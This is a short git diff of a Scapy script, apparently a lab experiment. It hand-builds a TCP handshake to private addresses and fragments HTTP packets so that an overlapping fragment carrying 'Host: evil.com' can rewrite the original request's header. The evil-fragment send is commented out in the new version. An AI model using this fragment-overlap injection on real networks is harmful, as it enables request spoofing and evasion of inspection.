@@ -14,15 +14,36 @@ new = "Host: evil.com\n\nthis packet is longer"
 s = "HTTP/1.1 GET /?aaaaaaaa\n"
 l = len(s)
 
-pkt1 = IP(dst=dstIP) / TCP(sport=8000, dport=80) / (s + orig_host)
-pkt2 = IP(dst=dstIP) / TCP(sport=8000, dport=80) / (s + new)
+#send(IP(dst=dstIP / TCP(sport=8000, dport=8080)))
+src = '192.168.1.78'
+dst = '192.168.1.80'
+sport = 8000
+dport = 8080
 
-pkts = fragment(pkt1, l + 40)
-pkts_evil = fragment(pkt2, l + 40)
+# SYN
+ip=IP(src=src,dst=dst)
+SYN=TCP(sport=sport,dport=dport,flags='S',seq=1000)
+#send(ip/SYN)
+SYNACK=sr1(ip/SYN)
 
-send(pkts)
-bad_p = pkts_evil[1]
-send(bad_p)
+# ACK
+print(SYNACK.ack)
+print(SYNACK.seq)
+ACK=TCP(sport=sport, dport=dport, flags='A', seq=SYNACK.ack, ack=SYNACK.seq+1)
+send(ip/ACK)
+pkt1 = ip/TCP(sport=8000, dport=8080, flags='P', seq=SYNACK.ack+1) / (s + orig_host)
+pkt2 = ip / TCP(sport=8000, dport=8080) / (s + new)
+
+pkts = fragment(pkt1, l + 20)
+print(pkts)
+pkts_evil = fragment(pkt2, l + 20)
+
+send(pkt1)
+#bad_p = pkts_evil[1]
+#send(bad_p)
+ACK=TCP(sport=sport, dport=dport, flags='F', seq=1044)
+sr1(ip/ACK)
+
 #bad_p.frag = 
 
 """
